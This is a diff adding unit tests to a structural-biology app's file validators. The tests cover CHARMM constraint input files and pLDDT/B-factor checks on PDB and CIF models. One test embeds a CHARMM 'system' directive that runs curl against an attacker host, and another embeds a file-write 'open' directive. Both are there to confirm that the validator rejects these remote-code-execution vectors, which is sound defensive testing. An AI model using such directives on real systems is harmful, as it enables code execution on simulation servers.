@@ -14,7 +14,8 @@ import {
   cifHasAllowedResiduesOnly,
   noLeadingSpaceOnPDBLines,
   detectGaffCofactors,
-  detectMetalCofactors
+  detectMetalCofactors,
+  isPlddtColumnAllZero
 } from '../ValidationFunctions'
 
 const makeFile = (name: string, content: string, type = 'text/plain') => {
@@ -56,6 +57,63 @@ describe('ValidationFunctions', () => {
       makeFile('const.inp', content),
       'pdb'
     )
+    expect(result).toBe(true)
+  })
+
+  it('isValidConstInpFile rejects system directive (CHARMM RCE vector)', async () => {
+    const content = [
+      'define fixed sele segid PROA end',
+      'cons fix sele fixed end',
+      'system "curl http://attacker.com"',
+      'return'
+    ].join('\n')
+    const result = await isValidConstInpFile(makeFile('evil.inp', content), 'pdb')
+    expect(typeof result).toBe('string')
+    expect(result as string).toContain('system')
+  })
+
+  it('isValidConstInpFile rejects open directive', async () => {
+    const content = [
+      'define fixed sele segid PROA end',
+      'cons fix sele fixed end',
+      'open unit 10 write card name /tmp/evil',
+      'return'
+    ].join('\n')
+    const result = await isValidConstInpFile(makeFile('evil.inp', content), 'pdb')
+    expect(typeof result).toBe('string')
+    expect(result as string).toContain('open')
+  })
+
+  it('isValidConstInpFile accepts ! comment lines', async () => {
+    const content = [
+      '! this is a comment',
+      'define fixed sele segid PROA end',
+      'cons fix sele fixed end',
+      'return'
+    ].join('\n')
+    const result = await isValidConstInpFile(makeFile('ok.inp', content), 'pdb')
+    expect(result).toBe(true)
+  })
+
+  it('isValidConstInpFile accepts * comment lines', async () => {
+    const content = [
+      '* another comment style',
+      'define fixed sele segid PROA end',
+      'cons fix sele fixed end',
+      'return'
+    ].join('\n')
+    const result = await isValidConstInpFile(makeFile('ok.inp', content), 'pdb')
+    expect(result).toBe(true)
+  })
+
+  it('isValidConstInpFile accepts cons harm lines', async () => {
+    const content = [
+      'define fixed sele segid PROA end',
+      'cons harm force 5.0 sele fixed end',
+      'cons fix sele fixed end',
+      'return'
+    ].join('\n')
+    const result = await isValidConstInpFile(makeFile('ok.inp', content), 'pdb')
     expect(result).toBe(true)
   })
 
@@ -472,5 +530,82 @@ describe('hasSaxsQualityIssues', () => {
     )
 
     expect(result.totalCount).toBe(1)
+  })
+})
+
+// Build an 80-column PDB ATOM record with the B-factor placed in cols 61-66.
+const pdbAtomLine = (
+  serial: number,
+  resSeq: number,
+  bfactor: number,
+  chain = 'A'
+): string => {
+  const line = Array(80).fill(' ')
+  const put = (start: number, str: string) => {
+    for (let i = 0; i < str.length; i++) line[start + i] = str[i]
+  }
+  put(0, 'ATOM')
+  put(6, String(serial).padStart(5))
+  put(12, ' CA ')
+  put(17, 'ALA')
+  put(21, chain)
+  put(22, String(resSeq).padStart(4))
+  put(30, '   0.000')
+  put(38, '   0.000')
+  put(46, '   0.000')
+  put(54, '  1.00')
+  put(60, bfactor.toFixed(2).padStart(6))
+  put(76, ' C')
+  return line.join('')
+}
+
+const makePdb = (bfactors: number[]): string =>
+  bfactors
+    .map((b, i) => pdbAtomLine(i + 1, i + 1, b))
+    .concat('END')
+    .join('\n')
+
+const makeCif = (bfactors: number[]): string =>
+  [
+    'data_test',
+    'loop_',
+    '_atom_site.group_PDB',
+    '_atom_site.id',
+    '_atom_site.label_comp_id',
+    '_atom_site.auth_asym_id',
+    '_atom_site.auth_seq_id',
+    '_atom_site.B_iso_or_equiv',
+    ...bfactors.map((b, i) => `ATOM ${i + 1} ALA A ${i + 1} ${b.toFixed(2)}`),
+    '#'
+  ].join('\n')
+
+describe('isPlddtColumnAllZero', () => {
+  it('returns true when every PDB B-factor is zero', async () => {
+    const file = makeFile('model.pdb', makePdb([0, 0, 0]))
+    expect(await isPlddtColumnAllZero(file)).toBe(true)
+  })
+
+  it('returns false when PDB B-factors carry pLDDT', async () => {
+    const file = makeFile('model.pdb', makePdb([80, 75, 90]))
+    expect(await isPlddtColumnAllZero(file)).toBe(false)
+  })
+
+  it('returns false when only some PDB B-factors are zero', async () => {
+    const file = makeFile('model.pdb', makePdb([0, 80, 0]))
+    expect(await isPlddtColumnAllZero(file)).toBe(false)
+  })
+
+  it('returns true when every CIF B_iso_or_equiv is zero', async () => {
+    const file = makeFile('model.cif', makeCif([0, 0, 0]))
+    expect(await isPlddtColumnAllZero(file)).toBe(true)
+  })
+
+  it('returns false when CIF B_iso_or_equiv carries pLDDT', async () => {
+    const file = makeFile('model.cif', makeCif([88, 90, 70]))
+    expect(await isPlddtColumnAllZero(file)).toBe(false)
+  })
+
+  it('returns false for an empty or unparseable file (no warning)', async () => {
+    expect(await isPlddtColumnAllZero(makeFile('empty.pdb', ''))).toBe(false)
   })
 })
